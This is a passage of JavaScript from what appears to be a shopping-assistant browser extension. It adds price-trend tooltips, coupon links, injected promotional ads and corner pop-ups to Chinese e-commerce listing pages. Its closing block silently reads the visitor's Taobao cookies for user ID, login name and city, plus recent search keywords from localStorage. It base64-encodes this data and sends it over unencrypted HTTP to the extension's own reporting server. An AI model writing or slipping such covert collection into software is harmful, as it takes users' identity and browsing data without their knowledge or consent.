                                that.parent().parent().find(".douyapulist-price-drop-zhide").html(`
                                历史最低 : <span class="douyapulist-price-drop-zhideMin">${min}元</span>
                                <div class="douyapulist-price-drop-zhideBack"></div>`);
                                if (valueList[valueList.length - 1] == min) {
                                    that.parent().parent().find(".douyapulist-price-drop-zhideBack").show();
                                }
                            },
                            error:function () {
                                var html = `<div class="douyapulist-price-ErrorContent">
                                    <div class="douyapulist-price-ErrorTitle">
                                        <p>小豆芽正在努力完善商品价格库，敬请期待哦~</p>
                                    </div>
                                    <div class="douyapulist-price-ErrorImg"></div>
                                </div>`;
                                that.find(".douyapulist-price-drop-echat").html(html);
                            }
                        });
                    }   //请求惠惠助手接口拿取商品历史价格数据
                    $.each($(k[0]),function () {
                        $(this).append(`<div class="douyapulist-price-item" data-type="0" data-douyamovepaopao="列表+查看+${k[2]}">
                            <div class="douyapulist-price-box" >
                                <div class="douyapulist-price-icon"></div>
                                <div>价格趋势</div>
                            </div>
                        </div>`);
                        if ($(this).offset().left > ($(document).width() * 1 - $(this).offset().left * 1)) {
                            $(this).children(".douyapulist-price-item").addClass("left");
                        }
                        if (v == 'search.jd.com') {
                            $(".douyapulist-price-item").css("marginBottom",65)
                        } else if (v == 'search.suning.com' || v == 'list.suning.com') {
                            $(".douyapulist-price-item").css({"top":106})
                        }
                    });
                    if (v == 'list.tmall.com' || v == 's.taobao.com') {
                        var time;
                        var sign = 1;
                        $(document).on("scroll",function () {
                            clearTimeout(time);
                            time = setTimeout(function () {
                                post();
                            },1500)
                        });
                        post();
                        function post() {
                            if (sign == 1) {
                                sign = 0;
                                var arr = {};
                                var dom = [];
                                $.each($(k[0]).find("img:not([data-ks-lazyload]):not([douyapuHasCoupon])"),function (v,k) {
                                    arr[v] = getParam($(this).parent().attr("href"),"id");
                                    dom.push(k);
                                });
                                if (dom.length) {
                                    $.ajax({
                                        url:"https://storage.douyapu.com/coupon/share.php",
                                        type:"post",
                                        dataType:"json",
                                        data:{items:JSON.stringify(arr)},
                                        success:function (d) {
                                            d = d.results;
                                            $.each(dom,function (v) {
                                                if (d[arr[v]] && d[arr[v]].amount) {
                                                    $(this).parent().after(`<a class="douyapulist-coupon" href="${d[arr[v]].shareUrl}" target="_blank" data-douyababapaopao="列表+优惠券">¥领${d[arr[v]].amount}券</a>`);
                                                }
                                                $(this).attr("douyapuHasCoupon",1)
                                            });
                                            sign = 1;
                                        },
                                        error:function () {
                                            sign = 1;
                                        }
                                    });
                                } else {
                                    sign = 1;
                                }
                            }
                        }
                    }
                    cnzzAppend();    //打点统计代码
                    var timeDouya;
                    var activeData;
                    chrome.extension.sendMessage({name:"universal",url:"https://min.douyapu.com/api/act17/plug-0.json",type:"get",dataType:"json"},function (response) {
                        if (response && response.results && response.results.length > 0) {
                            activeData = response.results;
                        }
                    });
                    $(document).on("mouseenter",k[0],function () {
                        $(this).find(".douyapulist-price-box").css("opacity",0.3);
                    });
                    $(document).on("mouseleave",k[0],function () {
                        $(this).find(".douyapulist-price-box").css("opacity",0);
                    });
                    $(document).on("mouseenter",".douyapulist-price-item",function (e) {
                        e.stopPropagation();
                        var that = $(this);
                        var url,price;
                        if (v == 's.taobao.com') {
                            url = that.parent().children(".pic-box-inner").children(".pic").children("a").attr("href");
                            price = that.parent().parent().find(".g_price").children("strong").html();
                        } else if (v == 'list.tmall.com') {
                            url = that.parent().children("a").attr("href");
                            price = that.parent().parent().find(".productPrice").find("em").text().split("¥")[1];
                        } else if (v == 'search.jd.com') {
                            url = that.parent().children(".p-img").children("a").attr("href");
                            price = that.parent().find(".p-price").find("i").html();
                        } else if (v == 'search.suning.com' || v == 'list.suning.com') {
                            url = that.parent().children(".img-block").children("a").attr("href");
                            price = that.parent().parent().find(".price").text().split("¥")[1];
                        } else if (v == 'search.gome.com.cn') {
                            url = that.parent().children("a").attr("href");
                            price = that.parent().parent().find(".price").text().split("¥")[1];
                        }
                        $(this).children(".douyapulist-price-box").css({"opacity":1,"background":"#FD2550"});
                        timeDouya = setTimeout(function () {
                            if (that.data("type") == 0) {
                                that.append(`<div class="douyapulist-price-dropBox">
                                    <div class="douyapulist-price-drop">
                                        <div class="douyapulist-price-drop-linear">
                                            <div class="douyapulist-price-drop-logo fl"></div>
                                            <div class="douyapulist-price-drop-set fr">
                                                <ul>
                                                    <li data-douyababapaopao="列表+意见反馈+${k[2]}" class="dypLi">意见反馈</li>
                                                    <li data-douyababapaopao="列表+本次关闭+${k[2]}" class="dypLi">本次关闭</li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div class="douyapulist-price-drop-zhide"></div>
                                        <div style="background: #fff">
                                            <div class="douyapulist-price-drop-echat"></div>
                                        </div>
                                        <div class="douyapulist-price-drop-ad">
                                            <div class="douyapulist-price-drop-adAll">
                                            </div>
                                        </div>
                                        <div class="douyapulist-price-drop-border"></div>
                                        <div class="douyapulist-price-drop-arrow"></div>
                                    </div>
                                </div>`);
                                if (activeData) {
                                    var html = "";
                                    $.each(activeData,function (v,k) {
                                        html += `<div data-douyababapaopao="列表+活动+ID${k.id}" class="douyapulist-price-drop-adItem">
                                            <div class="douyapulist-price-drop-icon icon${k.act_badge_label}"></div>
                                            <div><a href="${k.act_link}" target="_blank" rel="noreferrer">${k.act_name}</a></div>
                                        </div>`
                                    });
                                    that.find(".douyapulist-price-drop-adAll").append(html);
                                    that.find(".douyapulist-price-drop-adItem:eq(0)").clone(true).appendTo(that.find(".douyapulist-price-drop-adAll"));
                                    var liHeight = that.find(".douyapulist-price-drop-ad").height();
                                    var totalHeight = (that.find(".douyapulist-price-drop-adItem").length * that.find(".douyapulist-price-drop-adItem").eq(0).height()) - liHeight;
                                    that.find(".douyapulist-price-drop-adAll").height(totalHeight);
                                    var index = 0;
                                    var autoTimer = 0;
                                    var clickEndFlag = true;    //
                                    function tab() {
                                        that.find(".douyapulist-price-drop-adAll").stop().animate({
                                            top:-index * liHeight
                                        },400,function () {
                                            clickEndFlag = true;
                                            if (index == that.find(".douyapulist-price-drop-adItem").length - 1) {
                                                that.find(".douyapulist-price-drop-adAll").css({top:0});
                                                index = 0;
                                            }
                                        })
                                    }   //
                                    function next() {
                                        index++;
                                        if (index > that.find(".douyapulist-price-drop-adItem").length - 1) {
                                            index = 0;
                                        }
                                        tab();
                                    }   //
                                    autoTimer = setInterval(next,2500);
                                    that.children(".douyapulist-price-drop-adItem").hover(function () {
                                        clearInterval(autoTimer);
                                    },function () {
                                        autoTimer = setInterval(next,2500);
                                    });
                                }
                                $(that).on("click","li.dypLi",function () {
                                    if ($(this).html() == "意见反馈") {
                                        openWindow("https://www.douyapu.com/index/feedback/");
                                    } else {
                                        chrome.storage.local.set({dypListSetting:"hide"});
                                        $(".douyapulist-price-item").remove();
                                    }
                                });
                                get(url,price,that);
                                that.data("type",1);
                            } else {
                                that.children(".douyapulist-price-dropBox").css("top","-66px");
                            }
                        },500);
                    });
                    $(document).on("mouseleave",".douyapulist-price-item",function () {
                        var that = $(this);
                        $(this).children(".douyapulist-price-box").css({"opacity":0.3,"background":"#000"});
                        clearTimeout(timeDouya);
                        that.children(".douyapulist-price-dropBox").css("top","-9999px");
                    });
                }
            }
        }
    }();
    //主会场
    !function () {
        var total;
        chrome.storage.local.get(null,function (e) {
            var dypAlert = e.dypAlert20180226;
            var n = 0;
            dypAlert = JSON.parse(dypAlert).results;
            total = dypAlert.length;
            $.each(dypAlert,function (v,k) {
                n++;
                if (k.position.match('2')) {
                    start1(k,n);
                }
            });
        });
        function start1(k,n) {
            var urlOk = 0;
            var urlArr = k.plant.split('|');
            $.each(urlArr,function (v,k) {
                if (locHost == k) {
                    urlOk = 1;
                    return false;
                }
            });
            if (urlOk) {
                cnzzAppend();
                if (document.cookie.indexOf(`dypAlert${n}=1`) == -1) {
                    var curDate = new Date();
                    var curTamp = curDate.getTime();
                    var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
                    var passedTamp = curTamp - curWeeHours;
                    var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
                    var leftTime = new Date();
                    leftTime.setTime(leftTamp + curTamp);
                    document.cookie = `dypAlert${n}=1;expires=` + leftTime;
                    var typeimg = '',toUrl = '';
                    $("<style></style>").html(`#douyapu-alert${n}{z-index:999999999999;position:fixed;bottom:20px;right:40px;display:none}#douyapu-alert${n} img{display:block;max-width:300px;max-height:400px}#douyapu-alert${n}-close{width:30px;height:30px;position:absolute;right:0;top:0;cursor:pointer;opacity:1;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAM1BMVEUAAAAAAABlZWUAAAD19fWioqIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///9IKCr6AAAAEHRSTlOAAJ919bt9Y0AsJghKSVdLz5TIOAAAAKNJREFUKM+F01kOwyAMBNBJpuyQ9P6nLVULiRUw8xXxZIXFxtYTi6O1dCVea42TJ3rok+RAiDDc+cQj58UHBjkaZwyTfxwwSfhy4oyZKntM4yu3YrOjZTf/8g2xr732x1dEgXChyHAQLrQiIVxoRQvh5q6wkmHeBoKpVRNO+7dD0XaeEbVzR2yc3xrbk4zv3K8fVG8HvZn0VtQbWR+D9RAtRvAD7KoEY4+OgCAAAAAASUVORK5CYII=)}#douyapu-alert${n}-close:hover{opacity:.5}@keyframes dypslideInLeft{from{transform:translate3d(100%,0,0);visibility:visible}to{transform:translate3d(0,0,0)}}.dypslideInLeft{animation-name:dypslideInLeft}.dypanimated{animation-duration:1s;animation-fill-mode:both}`).appendTo("head");
                    typeimg = k.img_src;
                    toUrl = k.link ? k.link : 'javascript:void(0);';
                    $(document).ready(function () {
                        $("body").after(`<div id="douyapu-alert${n}" class="dypanimated dypslideInLeft" data-name="${k.name}">
                            <a href="${toUrl}" target="_blank" rel="noreferrer"><img src='${typeimg}'></a>
                            <div id="douyapu-alert${n}-close"></div>
                        </div>`);
                        setTimeout(function () {
                            var swi = 0;
                            for (var i = 1; i < n; i++) {
                                if ($(`#douyapu-alert${i}`).length) {
                                    swi = 1;
                                    break;
                                }
                            }
                            if (!swi) {
                                $(`#douyapu-alert${n}`).show();
                                cnzzEvent(`${k.name}`,"弹出");
                            }
                            $(`#douyapu-alert${n}-close`).click(function () {
                                cnzzEvent(`${k.name}关闭`,"点击");
                                var that = $(this);
                                that.parent().fadeOut(1000,function () {
                                    that.parent().remove();
                                });
                            });
                            var swi1 = 0;
                            var nextNum = "";
                            for (var j = n + 1; j < total + 1; j++) {
                                if ($(`#douyapu-alert${j}`).length) {
                                    swi1 = 1;
                                    nextNum = j;
                                    break;
                                }
                            }
                            if (swi1) {
                                $(`#douyapu-alert${n}-close`).click(function () {
                                    setTimeout(function () {
                                        $(`#douyapu-alert${nextNum}`).show();
                                        cnzzEvent(`${$(`#douyapu-alert${nextNum}`).data("name")}`,"弹出");
                                    },2500);
                                });
                            }
                        },1000 * n);
                    });
                }
            }
        } //右下角弹窗
    }();
    //淘宝首页用户信息上报
    !function () {
        if (locHost != "www.taobao.com") {
            return
        }
        function calcTime(cookieName,callBack) {
            if (document.cookie.indexOf(`${cookieName}=1`) == -1) {
                var curDate = new Date();
                var curTamp = curDate.getTime();
                var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
                var passedTamp = curTamp - curWeeHours;
                var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
                var leftTime = new Date();
                leftTime.setTime(leftTamp + curTamp);
                document.cookie = `${cookieName}=1;expires=` + leftTime;
                callBack();
            }
        }   //计算指定cookie剩余时间
        calcTime('dypInfo',firstStart);
        function firstStart() {
            var info = {
                useId:'',       //用户ID
                useName:'',     //用户名字
                city:'',        //用户城市
                useKeys:'',     //用户关键字
                source:1        //用户平台
            };  //
            var needNum = 6;    //入库关键字个数
            function getUseInfo() {
                var storageData = localStorage;
                var n = 0;  //
                function count() {
                    n++;
                    if (n != 3) {
                        return
                    }
                    chrome.storage.local.get(null,function (e) {
                        info.useId = info.useId ? info.useId : e.dypUseInfo18711 ? e.dypUseInfo18711.useId : "";
                        info.useName = info.useName ? info.useName : e.dypUseInfo18711 ? e.dypUseInfo18711.useName : "";
                        info.city = info.city ? info.city : e.dypUseInfo18711 ? e.dypUseInfo18711.city : "";
                        if (info.useId && info.useName) {
                            chrome.storage.local.set({dypUseInfo18711:{useId:info.useId,useName:info.useName,city:info.city}});
                            getKey();
                        }
                    });
                }   //
                function getKey() {
                    function getStorage(val) {
                        var keyword = [];
                        $.each(storageData,function (v,k) {
                            if (v == val) {
                                var index = 0;
                                $.each(JSON.parse(k),function (v,k) {
                                    index++;
                                    if (index <= needNum) {
                                        keyword.push(decodeURIComponent(k.key));
                                    }
                                });
                            }
                        });
                        return keyword.toString();
                    }   //
                    info.useKeys = getStorage(`suggest_history_historybaobei${info.useName}`) || getStorage(`suggest_history_historybaobei`);
                    postUseInfo();
                }   //获取keys
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"unb"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useId = d[0].value;
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"lgc"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useName = decodeURIComponent(d[0].value);
                        info.useName = unescape(info.useName.replace(/\\u/g,'%u'));
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"city"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.city = d[0].value;
                    }
                    count();
                });
            }   //获取用户数据
            function postUseInfo() {
                if (info.useId && info.useName) {
                    var base64Post = '';
                    $.each(info,function (v,k) {
                        base64Post += `${Base64.encode(k)}|`
                    });
                    base64Post = base64Post.replace(/\|$/gi,"");
                    chrome.extension.sendMessage({
                        name:"universal",url:"http://report.douyapu.com/api/usr",data:{
                            action:'info',
                            data:base64Post
                        },
                    },function () {
                    });
                }
            }   //上报用户数据
            getUseInfo();
        }
    }();
}();